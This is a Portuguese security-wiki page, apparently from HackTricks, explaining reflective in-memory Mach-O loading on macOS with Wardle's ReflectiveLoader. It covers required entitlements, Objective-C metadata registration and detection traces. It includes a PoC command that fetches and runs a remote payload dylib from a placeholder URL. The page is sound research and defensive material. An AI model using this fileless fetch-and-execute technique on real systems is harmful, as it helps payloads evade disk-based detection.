# Carregamento Reflective de Mach-O no macOS

{{#include ../../../banners/hacktricks-training.md}}

Um loader reflective mapeia uma imagem Mach-O a partir de bytes já presentes no próprio processo, depois a vincula e executa seus inicializadores sem solicitar ao system loader que abra um arquivo de payload. Isso é **execução de código no próprio processo**, não uma primitiva de elevação de privilégios ou de injeção em processo remoto.<sup>[[2]](#references)</sup>

Nas versões recentes do macOS, o caminho antigo `NSCreateObjectFileImageFromMemory`/`NSLinkModule` grava a imagem em disco. Em vez disso, ReflectiveLoader incorpora código antigo de carregamento do dyld da Apple; Wardle demonstrou isso no macOS 15 e 26.<sup>[[2]](#references)[[3]](#references)</sup>

Se o loader usar o Hardened Runtime, seu código não assinado em memória precisa de uma exceção para memória executável, como `com.apple.security.cs.allow-unsigned-executable-memory` ou `com.apple.security.cs.disable-executable-page-protection`; caso contrário, a execução será bloqueada pela aplicação das regras de code signing. Essa é uma restrição de assinatura do loader, não uma primitiva de elevação de privilégios. Consulte a [referência de entitlements do macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Para o PoC, forneça uma URL que sirva um **bundle, framework ou dylib** Mach-O bruto. O arquivo `main.mm` rejeita downloads vazios e informa que payloads que usam `LC_DYLD_CHAINED_FIXUPS` não são compatíveis. Também é aceito um caminho local, mas essa entrada não corresponde a um fluxo de trabalho sem arquivos. O formato com URL lê os bytes em `NSData` e passa seu buffer e comprimento para `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

O carregador incorporado chama `ImageLoaderMachO::instantiateFromMemory` e, em seguida, `image->link`. Ele registra os metadados de Objective-C **após a vinculação, mas antes de** `image->runInitializers`, que executa os construtores.<sup>[[5]](#references)</sup> Sem o registro, um construtor que envia uma mensagem de Objective-C pode falhar com `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Consulte o [fluxo normal de carregamento de imagens do dyld](macos-library-injection/macos-dyld-process.md#flow) e a [referência das seções Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Ativando metadados de Objective-C

Ao contrário do carregamento normal do dyld, incorporar o carregador de imagens mais antigo não torna automaticamente os metadados de Objective-C do payload utilizáveis pelo `libobjc`.<sup>[[3]](#references)</sup> A abordagem adaptada do LLVM JIT percorre as seções de Objective-C `__DATA` e `__DATA_CONST` mapeadas e, em seguida, executa estas etapas antes de os construtores serem executados:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Percorra `__objc_selrefs` em incrementos de `sizeof(SEL)`. Obtenha o nome de cada seletor não nulo com `sel_getName`, passe-o para `sel_registerName` e substitua o ponteiro da seção pelo `SEL` canônico.
2. Colete as classes de `__objc_classlist` e registre-as com `objc_readClassPair`, resolvendo primeiro as dependências das superclasses.
3. Reescreva as referências em `__objc_classrefs` e `__objc_superrefs` para apontarem para classes ou metaclasses registradas e anexe os métodos das categorias de `__objc_catlist`.

Por exemplo, o reparo de seletores em `ObjCRuntime.cpp` é equivalente a:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

A PoC depende do comportamento interno do runtime Objective-C e não oferece suporte a todos os recursos do formato Mach-O; portanto, seu código de registro serve como referência de implementação, não como um loader genérico pronto para uso.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> O registro é necessário tanto para as classes e os métodos Apple referenciados quanto para as classes definidas pelo payload.<sup>[[3]](#references)</sup>

Nos testes do autor, uma imagem carregada refletivamente não aparece em `dyld_all_image_infos`. Em vez disso, os mapeamentos executáveis anônimos podem aparecer como regiões `dylib` sem nome no `vmmap`; frames amostrados podem ser exibidos como `<unknown binary>`. Esses são indícios para inspeção, não uma atribuição confiável a este loader, e o acesso às informações de tarefa de outro processo é limitado por entitlements. Consulte [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) para ver as restrições de acesso a processos.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C e Swift no macOS: compilação de conhecimentos](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Restaurando o carregamento reflexivo de código no macOS (Parte I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Restaurando o carregamento reflexivo de código no macOS (Parte II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
